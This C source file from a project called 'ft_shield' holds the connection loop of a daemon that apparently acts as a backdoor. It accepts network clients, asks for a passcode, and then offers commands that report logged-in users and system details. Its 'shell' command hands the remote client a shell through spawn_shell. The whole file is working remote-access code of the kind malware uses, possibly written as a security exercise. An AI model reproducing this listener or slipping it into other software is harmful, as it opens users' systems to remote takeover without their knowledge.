#include "ft_shield.h"

static void	handle_new_connection(t_shield *daemon, fd_set *read_fds)
{
	if (!daemon || !read_fds)
		return ;

	if (FD_ISSET(daemon->listen_fd, read_fds))
	{
		int client_fd = accept(daemon->listen_fd, NULL, NULL);
		if (client_fd < 0)
		{
			if (errno == EINTR)
				return ;
			daemon->stop_flag = 1;
			return ;
		}
		if (daemon->client_count < MAX_CLIENTS)
		{
			daemon->client_fds[daemon->client_count] = client_fd;
			daemon->client_authenticated[daemon->client_count] = 0;
			const char *pass_prompt = ">_ passcode: ";
			daemon->bytes_out += send(client_fd, pass_prompt, strlen(pass_prompt), 0);
			daemon->client_count++;
		}
		else
			close(client_fd);
	}
}

static void	process_client_messages(t_shield *daemon, fd_set *read_fds)
{
	if (!daemon || !read_fds)
		return ;

	char buffer[BUFFER_SIZE];

	for (int i = 0; i < daemon->client_count; i++)
	{
		int client_fd = daemon->client_fds[i];

		if (FD_ISSET(client_fd, read_fds))
		{
			ssize_t bytes_read = read(client_fd, buffer, sizeof(buffer) - 1);
			if (bytes_read <= 0)
			{
				close(client_fd);
				for (int j = i; j < daemon->client_count - 1; j++)
				{
					daemon->client_fds[j] = daemon->client_fds[j + 1];
					daemon->client_authenticated[j] = daemon->client_authenticated[j + 1];
				}
				daemon->client_count--;
				i--;
				continue ;
			}
			daemon->bytes_in += bytes_read;

			buffer[bytes_read] = '\0';
			char *newline = strchr(buffer, '\n');
			if (newline) *newline = '\0';
			newline = strchr(buffer, '\r');
			if (newline) *newline = '\0';

			if (!daemon->client_authenticated[i])
			{
				if (verify_pass(buffer))
				{
					daemon->client_authenticated[i] = 1;
					display_prompt(client_fd, daemon);
				}
				else
				{
					close(client_fd);
					for (int j = i; j < daemon->client_count - 1; j++)
					{
						daemon->client_fds[j] = daemon->client_fds[j + 1];
						daemon->client_authenticated[j] = daemon->client_authenticated[j + 1];
					}
					daemon->client_count--;
					i--;
					continue ;
				}
			}
			else
			{
				if (!strcmp(buffer, "?"))
					print_usage(client_fd, daemon);
				else if (!strcmp(buffer, "shell"))
				{
					spawn_shell(daemon, client_fd);
					return ;
				}
				else if (!strcmp(buffer, "users"))
				{
					send_sys_output("who", client_fd, daemon);
					display_prompt(client_fd, daemon);
				}
				else if (!strcmp(buffer, "system"))
				{
					send_sys_output("uname -a", client_fd, daemon);
					send_sys_output("uptime", client_fd, daemon);
					display_prompt(client_fd, daemon);
				}
				else if (!strcmp(buffer, "stats"))
				{
					display_stats(client_fd, daemon, i + 1);
					display_prompt(client_fd, daemon);
				}
				else if (!strcmp(buffer, "quit"))
				{
					daemon->stop_flag = 1;
					break ;
				}
				else
					display_prompt(client_fd, daemon);
			}
		}
	}
}

void	allow_connections(t_shield *daemon)
{
	if (!daemon)
		return ;

	fd_set read_fds;
	int max_fd;

	while (!daemon->stop_flag)
	{
		if (g_signal != 0)
		{
			daemon->stop_flag = 1;
			break ;
		}
		FD_ZERO(&read_fds);
		FD_SET(daemon->listen_fd, &read_fds);
		max_fd = daemon->listen_fd;
		
		for (int i = 0; i < daemon->client_count; i++)
		{
			FD_SET(daemon->client_fds[i], &read_fds);
			if (daemon->client_fds[i] > max_fd)
				max_fd = daemon->client_fds[i];
		}
		struct timeval timeout;
		timeout.tv_sec = 1;
		timeout.tv_usec = 0;

		int activity = select(max_fd + 1, &read_fds, NULL, NULL, &timeout);
		if (activity < 0)
		{
			if (errno == EINTR)
			{
				if (g_signal != 0)
				{
					daemon->stop_flag = 1;
					break ;
				}
				continue ;
			} 
			else
				break ;
		}
		handle_new_connection(daemon, &read_fds);
		process_client_messages(daemon, &read_fds);
	}

	if (daemon->listen_fd != -1)
	{
		close(daemon->listen_fd);
		daemon->listen_fd = -1;
	}
}

void	close_all_clients(t_shield *daemon)
{
	if (!daemon)
		return ;

	for (int i = 0; i < daemon->client_count; i++)
	{
		close(daemon->client_fds[i]);
	}
	daemon->client_count = 0;
}
